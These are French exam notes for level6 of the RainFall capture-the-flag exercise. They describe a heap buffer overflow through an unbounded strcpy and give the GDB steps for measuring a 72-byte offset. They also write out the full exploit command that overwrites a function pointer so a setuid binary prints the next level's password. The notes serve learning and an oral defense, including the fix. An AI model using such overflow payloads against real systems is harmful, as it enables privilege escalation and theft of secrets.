# Level6 - Exam Notes

## 1. Objective
Afficher le mot de passe level7. Le binaire est setuid level7 ; `n()` exécute `system("/bin/cat /home/user/level7/.pass")` mais n’est pas appelée. Par défaut un pointeur de fonction pointe vers `m()` ("Nope").

## 2. Copy the binary (extraction)
Depuis l’hôte :
```bash
sshpass -p '<level6_password>' scp -o StrictHostKeyChecking=no -P 4242 level6@localhost:level6 ./level6.bin
```
Référence : `commands.md`, Recon / Extraction.

## 3. Binary-to-source translation (source reconstruction)
- **Objdump -d main :** main fait deux `malloc` : le premier 0x40 (64 octets) pour un buffer, le second 4 octets pour un pointeur. Le pointeur est initialisé avec l’adresse de **m**. Puis **strcpy(buffer, argv[1])** sans limite, puis **call *ptr** (indirection du pointeur).
- **Où ça peut casser :** strcpy copie argv[1] sans borne. Le bloc de 4 octets (pointeur) est après le buffer sur le heap. En dépassant 64 octets (plus possible en-tête de chunk), on écrase ce pointeur. Si on y met l’adresse de **n**, call *ptr exécutera n() → affichage du mot de passe.
- Source : voir `source.c` / `source.md`.

## 4. Understanding where it can break (vulnerability hypothesis)
- **Fonctions suspectes :** strcpy(buffer, argv[1]) sans limite ; buffer 64 octets.
- **Succès :** que call *ptr invoque n() au lieu de m(). Donc écraser le pointeur par l’adresse de n (0x08048454).
- **Hypothèse :** buffer overflow sur le heap ; l’offset exact dépend du layout (64 + en-tête). Sur Rainfall : **72** octets avant les 4 octets du pointeur.

## 5. GDB diagnosis step-by-step

1. **Lancer GDB**  
   ```bash
   gdb -q ./level6.bin
   ```

2. **Repérer main et l’appel indirect**  
   ```gdb
   disas main
   ```  
   Noter : malloc(0x40), malloc(4), strcpy, puis l’instruction qui charge le pointeur et fait **call** (ex. call *%eax). Mettre un breakpoint juste avant ce call.

3. **Breakpoint avant call *ptr**  
   ```gdb
   break *<adresse_avant_call_indirect>
   run $(python -c 'print "A"*72 + "BBBB"')
   ```  
   But : voir la valeur du registre (ex. eax) qui va être utilisée pour le call. Si l’overflow est correct, avant l’overflow eax = adresse de m ; avec 72 + "BBBB" on veut voir si on contrôle déjà (ex. 0x42424242) ou si il faut 72 (sur Rainfall 72 donne l’adresse de n si on met les bons octets).

4. **Mesurer l’offset**  
   Essayer 64, 68, 72. Avec 72 + "\x54\x84\x04\x08" (adresse de n en LE), au breakpoint :  
   ```gdb
   p/x $eax
   ```  
   Doit afficher 0x08048454. Si oui, offset **72** confirmé. Sinon ajuster (64 ou 68 selon le layout heap).

5. **Adresses**  
   ```gdb
   info functions n
   info functions m
   ```  
   **n = 0x08048454**, m = 0x08048468. Pour l’exploit on n’a besoin que de l’adresse de n en little-endian.

6. **Vérification**  
   `run $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`. Après le call, le programme doit exécuter n() et afficher le mot de passe (si on est sur la VM avec le fichier .pass). Cela prouve le détournement du pointeur de fonction.

## 6. Exploit design and command explanation

**Génération de la commande (converter.py) :**  
`level6/converter.py` prend l’offset (72 sur RainFall) et l’adresse de **n** (0x08048454) et affiche la commande finale. Entrées : valeurs trouvées en GDB (section 5).

**Conception :** Overflow heap via strcpy ; la cible n’est pas la stack mais le **pointeur de fonction** stocké juste après le buffer. En l’écrasant avec l’adresse de n(), l’instruction `call *ptr` invoque n() → system("/bin/cat .../.pass").

**Commande finale (`commands.md`, Exploitation) :**
```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

**Décomposition :**

- **Invocation :** le programme lit argv[1] uniquement ; pas besoin de garder stdin ouvert. On passe le payload en argument.

- **Partie 1 — 72 octets 'A' (padding)**  
  - Remplissent le buffer de 64 octets et dépassent jusqu’au pointeur (offset 72 trouvé en GDB : 64 + 8 octets d’en-tête/alignement sur Rainfall).  
  - Ces octets écrasent tout jusqu’à (mais pas inclus) les 4 octets du pointeur.

- **Partie 2 — 4 octets : adresse de n (nouvelle valeur du pointeur)**  
  - Adresse : **0x08048454**.  
  - Little-endian : octet de poids faible en premier → 54, 84, 04, 08.  
  - En Python : `\x54\x84\x04\x08`.  
  - Rôle : ces 4 octets écrasent le pointeur de fonction. Au `call *ptr`, le CPU lit 0x08048454 et saute à n().

Résumé : **72 × 'A'** = offset jusqu’au pointeur ; **\x54\x84\x04\x08** = adresse de n en LE → le pointeur pointe vers n(), le mot de passe s’affiche.

## 7. Reproducible procedure (for evaluation)
- **Commande :** `./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')`. Le mot de passe level7 s’affiche.
- **Résultat attendu :** sortie = contenu de /home/user/level7/.pass.
- **À dire :** « strcpy sans limite ; le pointeur de fonction est à 72 octets (buffer 64 + en-tête). J’écrase ce pointeur avec l’adresse de n pour que call *ptr exécute n() et affiche le mot de passe. »

## 8. Oral defense points
- **Bug :** strcpy(buffer, argv[1]) sans contrôle de longueur ; buffer 64 octets (main).
- **GDB :** confirme l’offset 72 et que le registre du call vaut 0x08048454 après overflow.
- **Payload :** 72 octets + adresse de n en LE ; pas de shellcode.
- **Fix :** strncpy avec limite ou vérifier la longueur de argv[1].

## 9. Common evaluator questions
- **Pourquoi 72 et pas 64 ?** En-têtes de blocs malloc ou alignement ; 72 observé en GDB sur Rainfall.
- **Où est le pointeur ?** Dans le second bloc malloc(4), juste après le buffer sur le heap.
- **Little-endian de 0x08048454 ?** 54 84 04 08 → \x54\x84\x04\x08.
- **Stack ou heap ?** Heap : buffer et pointeur sont alloués par malloc.
